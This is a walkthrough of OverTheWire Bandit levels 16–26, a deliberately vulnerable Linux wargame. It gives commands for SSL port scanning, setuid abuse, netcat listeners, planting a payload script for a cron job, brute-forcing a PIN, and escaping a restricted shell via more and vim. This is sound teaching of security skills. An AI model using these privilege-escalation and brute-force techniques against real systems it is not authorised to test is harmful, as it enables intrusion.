# Day 15 🏴 OverTheWire: Bandit — Levels 16–25 Walkthrough

> **Important:** Passwords change periodically. You must solve each level yourself to obtain the next password. This guide walks you through *how* to solve each level, not what the passwords are.

---

## Table of Contents

- [How Bandit Works](#how-bandit-works)
- [Level 16 → 17](#level-16--17)
- [Level 17 → 18](#level-17--18)
- [Level 18 → 19](#level-18--19)
- [Level 19 → 20](#level-19--20)
- [Level 20 → 21](#level-20--21)
- [Level 21 → 22](#level-21--22)
- [Level 22 → 23](#level-22--23)
- [Level 23 → 24](#level-23--24)
- [Level 24 → 25](#level-24--25)
- [Level 25 → 26](#level-25--26)
- [Quick Reference](#quick-reference)
- [Common Errors](#common-errors)

---

## How Bandit Works

Each level requires you to **find** the next password — it is never given to you. The password for the next level is always stored at:

```
/etc/bandit_pass/banditXX
```

But you can only read it after earning access through that level's challenge. Solve the puzzle → copy the password → SSH into the next level.

---

## Level 16 → 17

**Concept:** Port scanning + SSL/TLS

**Goal:** One port between 31000–32000 speaks SSL. Submit your current password to it and receive an RSA private key for the next level.

### Steps

```bash
# 1. SSH in as bandit16
ssh bandit16@bandit.labs.overthewire.org -p 2220

# 2. Scan the port range for SSL services
nmap -sV -p 31000-32000 localhost

# 3. Connect to the SSL port (replace PORT with what nmap found)
openssl s_client -connect localhost:PORT

# 4. Paste your bandit16 password when prompted
# You'll receive an RSA private key — copy the entire block including headers

# 5. Save the key to a temp file
mkdir /tmp/mykey && chmod 700 /tmp/mykey
nano /tmp/mykey/sshkey.private
# Paste the RSA key, save and exit

# 6. Set correct permissions (required or SSH won't accept it)
chmod 600 /tmp/mykey/sshkey.private
```

**Key tools:** `nmap -sV` (service detection), `openssl s_client` (SSL connection)

**Why it works:** `nmap` with service detection identifies which port is running an SSL/TLS service. Once connected with `openssl s_client`, the server accepts your password and returns a private key instead of a password string.

---

## Level 17 → 18

**Concept:** File diffing with `diff`

**Goal:** Two files exist — `passwords.old` and `passwords.new`. The password is the one line that was changed.

### Steps

```bash
# 1. SSH in using the private key from the previous level
ssh -i /tmp/mykey/sshkey.private bandit17@bandit.labs.overthewire.org -p 2220

# 2. Compare the two password files
diff passwords.old passwords.new

# The line marked with '>' (in passwords.new but not old) is the password
```

**Key tools:** `diff`

**Why it works:** `diff` outputs lines that differ between two files. The line that exists only in `passwords.new` (marked with `>`) is the updated/new password for bandit18.

---

## Level 18 → 19

**Concept:** Bypassing `.bashrc` logout trap via SSH command execution

**Goal:** The `.bashrc` has been modified to immediately log you out. The password is in `~/readme`.

### Steps

```bash
# Pass a command directly to SSH — it runs before the interactive shell loads
ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme

# The password will be printed directly in your terminal
```

**Alternative (if you want a shell):**
```bash
ssh bandit18@bandit.labs.overthewire.org -p 2220 -t "bash --norc"
```

**Key tools:** SSH command execution, `bash --norc`

**Why it works:** Appending a command to the SSH invocation runs it in a non-interactive context, bypassing `.bashrc`. The `--norc` flag tells bash not to load any rc files at all.

---

## Level 19 → 20

**Concept:** Setuid binaries

**Goal:** A setuid binary called `bandit20-do` is in your home directory. Use it to read the next password.

### Steps

```bash
# 1. SSH in as bandit19
ssh bandit19@bandit.labs.overthewire.org -p 2220

# 2. List files and notice the setuid bit
ls -la
# Look for the 's' in permissions: -rwsr-x--- bandit20-do

# 3. Use the binary to run a command as bandit20
./bandit20-do cat /etc/bandit_pass/bandit20
```

**Key tools:** `ls -la`, setuid binary

**Why it works:** The `s` (setuid) bit means the binary runs with the **file owner's** privileges (bandit20), not the caller's. So any command you pass to it executes as bandit20, allowing you to read files bandit20 owns.

---

## Level 20 → 21

**Concept:** Netcat listeners + setuid binary communication

**Goal:** A binary `suconnect` connects to a port you specify, reads a line, and if it matches the current password, sends back the next password.

### Steps

```bash
# 1. SSH in as bandit20
ssh bandit20@bandit.labs.overthewire.org -p 2220

# 2. Open a listener in the background that sends your current password
echo "YOUR_BANDIT20_PASSWORD" | nc -l -p 9999 &

# 3. Run the binary pointing at your listener
./suconnect 9999

# If the password is correct, bandit21's password is printed
```

**Key tools:** `nc -l` (netcat listener), background jobs with `&`

**Why it works:** `nc -l` opens a TCP listener on port 9999. The binary connects to it, reads the password you sent, verifies it against `/etc/bandit_pass/bandit20`, and if correct, responds with bandit21's password.

---

## Level 21 → 22

**Concept:** Cron job inspection

**Goal:** A cron job runs periodically as bandit22. Find what it does and exploit it.

### Steps

```bash
# 1. SSH in as bandit21
ssh bandit21@bandit.labs.overthewire.org -p 2220

# 2. Check what cron jobs are configured
ls /etc/cron.d/
cat /etc/cron.d/cronjob_bandit22

# 3. Read the script being run
cat /usr/bin/cronjob_bandit22.sh

# 4. The script writes bandit22's password to a /tmp file — read it
cat /tmp/<filename_shown_in_script>
```

**Key tools:** `/etc/cron.d/`, cron job scripts

**Why it works:** Cron runs the script as bandit22, which has permission to read bandit22's password. The script writes it to a world-readable `/tmp` file, which you can then read as bandit21.

---

## Level 22 → 23

**Concept:** Reverse-engineering dynamic filenames using `md5sum`

**Goal:** Same as level 21, but the output filename is generated dynamically using `md5sum` of a string. You must calculate it yourself.

### Steps

```bash
# 1. SSH in as bandit22
ssh bandit22@bandit.labs.overthewire.org -p 2220

# 2. Read the cron job and its script
cat /etc/cron.d/cronjob_bandit23
cat /usr/bin/cronjob_bandit23.sh

# 3. The script does something like:
#    mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
# Reproduce it for bandit23:
echo I am user bandit23 | md5sum | cut -d ' ' -f 1
# Copy the resulting hash

# 4. Read the file at that hash path
cat /tmp/<hash_from_above>
```

**Key tools:** `md5sum`, `cut`, cron analysis

**Why it works:** You mimic the script's logic but substitute `bandit23` as the username. This gives you the exact filename the cron job wrote bandit23's password to.

---

## Level 23 → 24

**Concept:** Exploiting a cron job that executes scripts from a watched directory

**Goal:** A cron job runs every script placed in `/var/spool/bandit24/foo` as bandit24, then deletes them. Write a script that extracts the password.

### Steps

```bash
# 1. SSH in as bandit23
ssh bandit23@bandit.labs.overthewire.org -p 2220

# 2. Read the cron job to confirm behavior
cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh

# 3. Create a working directory with open permissions
mkdir /tmp/mywork
chmod 777 /tmp/mywork

# 4. Write your payload script
cat > /tmp/mywork/extract.sh << 'EOF'
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/mywork/password.txt
EOF

chmod +x /tmp/mywork/extract.sh

# 5. Copy it to the watched directory
cp /tmp/mywork/extract.sh /var/spool/bandit24/foo/

# 6. Wait up to 60 seconds for the cron job to run
sleep 60

# 7. Read the output
cat /tmp/mywork/password.txt
```

**Key tools:** Bash scripting, cron exploitation, file permissions

**Why it works:** The cron job executes as bandit24 and runs all scripts in that folder. Your script runs with bandit24's privileges, which can read bandit24's password and write it somewhere you can access.

---

## Level 24 → 25

**Concept:** Brute-forcing a 4-digit PIN via netcat

**Goal:** A daemon on port 30002 gives you bandit25's password if you supply the correct password + a 4-digit PIN (0000–9999).

### Steps

```bash
# 1. SSH in as bandit24
ssh bandit24@bandit.labs.overthewire.org -p 2220

# 2. Create a working directory
mkdir /tmp/bruteforce && cd /tmp/bruteforce

# 3. Write the brute force script
cat > brute.sh << 'EOF'
#!/bin/bash
PASSWORD="YOUR_BANDIT24_PASSWORD"
for i in $(seq -w 0000 9999); do
    echo "$PASSWORD $i"
done | nc localhost 30002
EOF

chmod +x brute.sh

# 4. Run it and filter out wrong attempts
bash brute.sh | grep -v "Wrong"
# Wait — the correct PIN line will show the next password
```

**Faster alternative using a wordlist file:**
```bash
# Generate all combinations to a file first
for i in $(seq -w 0000 9999); do
    echo "YOUR_BANDIT24_PASSWORD $i"
done > combinations.txt

# Send them all at once
nc localhost 30002 < combinations.txt | grep -v "Wrong"
```

**Key tools:** Bash loops, `seq`, `nc`, `grep`

**Why it works:** You generate all 10,000 combinations of `password + PIN` and stream them to the daemon. Filtering out "Wrong" responses leaves only the success line containing bandit25's password.

---

## Level 25 → 26

**Concept:** Restricted shell escape via `more` → `vim`

**Goal:** bandit26 uses a custom restricted shell (`/usr/bin/showtext`) that opens a text file with `more` then exits. Escape it to get a real shell.

### Steps

```bash
# 1. SSH in as bandit25
ssh bandit25@bandit.labs.overthewire.org -p 2220

# 2. Check what shell bandit26 uses
cat /etc/passwd | grep bandit26
# You'll see something like: /usr/bin/showtext

# 3. Read that shell to understand it
cat /usr/bin/showtext
# It runs: more ~/text.txt  then exits

# 4. THE TRICK — shrink your terminal window to only 2-3 rows tall
#    (drag the window edge to make it tiny)
#    This forces 'more' into interactive paging mode instead of exiting immediately

# 5. Login as bandit26 using the SSH key in your home directory
ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220
# 'more' is now paginating and waiting for input

# 6. While in 'more', press: v
#    This opens the content in vim

# 7. Inside vim, set your shell and launch it:
:set shell=/bin/bash
:shell

# You now have a real bash shell as bandit26!

# 8. Read the password
cat /etc/bandit_pass/bandit26
```

**Key tools:** Terminal window sizing, `more` pager, vim shell escape

**Why it works:** `more` only enters interactive mode when the content doesn't fit on screen. Once interactive, pressing `v` launches `$EDITOR` (vim). Vim allows you to set and spawn a new shell with `:set shell=` and `:shell`, bypassing the restricted environment entirely.

---

## Quick Reference

| Level | Core Concept | Key Commands |
|-------|-------------|--------------|
| 16 → 17 | Port scanning + SSL | `nmap -sV`, `openssl s_client` |
| 17 → 18 | File comparison | `diff` |
| 18 → 19 | Bypass `.bashrc` | `ssh user@host command` |
| 19 → 20 | Setuid binaries | `ls -la`, `./binary command` |
| 20 → 21 | Netcat listener | `nc -l -p PORT` |
| 21 → 22 | Cron job inspection | `cat /etc/cron.d/`, `/tmp/` files |
| 22 → 23 | Dynamic filename reversal | `md5sum`, `cut` |
| 23 → 24 | Cron code execution | Bash script, `/var/spool/` |
| 24 → 25 | PIN brute force | `seq`, `nc`, `grep` |
| 25 → 26 | Restricted shell escape | Terminal size, `more`, vim |

---

## Common Errors

### Permission Denied on SSH key
```bash
# Fix: key permissions must be 600
chmod 600 /path/to/sshkey.private
```

### Script not executing (Level 23 → 24)
```bash
# Fix: make both the script and output directory writable
chmod +x /tmp/mywork/extract.sh
chmod 777 /tmp/mywork
```

### `more` exits immediately (Level 25 → 26)
Make your terminal window **physically smaller** — only 2–3 rows tall — before connecting via SSH. This is the entire trick.

### Netcat listener already in use
```bash
# Pick a different port number (e.g. 9998, 12345)
nc -l -p 12345
```

### Wrong password when moving between levels
Passwords **rotate periodically**. If a password stops working, you need to re-solve the previous level to get the current one. Never rely on saved passwords from guides.

---

*Happy hacking! — OverTheWire Bandit is a great way to build real Linux and security skills.*Day